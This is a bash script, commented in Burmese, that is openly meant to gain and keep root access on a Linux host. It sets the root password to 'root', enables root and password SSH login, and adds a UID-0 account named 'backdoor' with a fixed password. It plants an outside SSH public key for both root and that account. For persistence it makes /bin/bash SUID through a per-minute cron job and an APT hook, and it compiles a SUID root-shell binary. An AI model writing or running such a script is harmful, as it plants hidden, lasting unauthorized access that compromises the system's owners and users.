#!/bin/bash
# Root အခွင့်အရေးရရန် script

set -e  # Error ဖြစ်ပါက ချက်ချင်းထွက်ရန်

# လိုအပ်သော directory များဖန်တီးခြင်း
mkdir -p /var/run/sshd /run/sshd

# Root password သတ်မှတ်ခြင်း
echo 'root:root' | chpasswd

# SSH host keys ဖန်တီးခြင်း
ssh-keygen -A

# SSH config ပြင်ဆင်ခြင်း
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Subsystem sftp အားလုံးကို ဖျက်ပြီး အသစ်ထည့်ခြင်း
sed -i '/Subsystem sftp/d' /etc/ssh/sshd_config
echo "Subsystem sftp internal-sftp" >> /etc/ssh/sshd_config

# Backdoor user ဖန်တီးခြင်း
groupadd backdoor 2>/dev/null || true
useradd -ou 0 -g backdoor -M -s /bin/bash backdoor 2>/dev/null || true
echo 'backdoor:Pwrisk' | chpasswd

# Backdoor SSH key ထည့်ခြင်း
mkdir -p /home/backdoor/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor 2>/dev/null || true
chmod 700 /home/backdoor /home/backdoor/.ssh
chmod 600 /home/backdoor/.ssh/authorized_keys

# Root SSH key ထည့်ခြင်း
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Persistence ထည့်ခြင်း
chmod u+s /bin/bash
echo "* * * * * root chmod u+s /bin/bash" > /etc/cron.d/suid
chmod 644 /etc/cron.d/suid
echo 'APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};' > /etc/apt/apt.conf.d/99pwn

# SUID C program ဖန်တီးခြင်း
cat > /tmp/rootsh.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/rootsh.c -o /usr/local/bin/rootsh
chmod u+s /usr/local/bin/rootsh

# Cron ကို background တွင် run ခြင်း
cron -f &

# SSH daemon ကို foreground တွင် run ခြင်း
exec /usr/sbin/sshd -D -e
